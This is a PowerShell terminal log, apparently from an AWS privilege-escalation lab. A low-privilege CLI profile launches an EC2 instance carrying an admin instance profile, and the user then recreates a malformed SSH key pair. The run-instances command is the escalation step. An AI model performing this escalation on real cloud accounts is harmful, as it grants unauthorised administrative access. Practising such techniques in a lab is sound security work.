--- Instance launch (attempt 2: t3.small, but with the corrupted key) ---

PS C:\Users\USER> aws ec2 run-instances --image-id ami-0bdbbea3e76315b75 --instance-type t3.small --key-name bincom-privesc-key --security-group-ids sg-07dd6d0efee71dcaf --subnet-id subnet-014b46080b850a527 --iam-instance-profile Name=EC2-Admin-Instance-Profile --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=privesc-exploit-instance}]" --profile bincom-dev-user
[Result: InstanceId = i-06b8c4cc0dd2ad0bc, launched successfully]

PS C:\Users\USER> ssh -i bincom-privesc-key.pem ec2-user@<PUBLIC_IP>
Load key "bincom-privesc-key.pem": invalid format
ec2-user@<PUBLIC_IP>: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).

--- Fix: recreate key pair with correct encoding, relaunch ---

PS C:\Users\USER> Remove-Item bincom-privesc-key.pem
PS C:\Users\USER> aws ec2 terminate-instances --instance-ids i-06b8c4cc0dd2ad0bc --profile bincom-dev-user
{
    "TerminatingInstances": [
        {
            "InstanceId": "i-06b8c4cc0dd2ad0bc",
            "CurrentState": { "Code": 32, "Name": "shutting-down" },
            "PreviousState": { "Code": 16, "Name": "running" }
        }
    ]
}

PS C:\Users\USER> aws ec2 delete-key-pair --key-name bincom-privesc-key --profile bincom-admin
{ "Return": true, "KeyPairId": "key-0dc9069afc7f2b704" }

PS C:\Users\USER> aws ec2 create-key-pair --key-name bincom-privesc-key --query "KeyMaterial" --output text --profile bincom-admin | Out-File -Encoding ascii bincom-privesc-key.pem

PS C:\Users\USER> icacls.exe bincom-privesc-key.pem /reset
PS C:\Users\USER> icacls.exe bincom-privesc-key.pem /grant:r "$($env:USERNAME):(R)"
PS C:\Users\USER> icacls.exe bincom-privesc-key.pem /inheritance:r

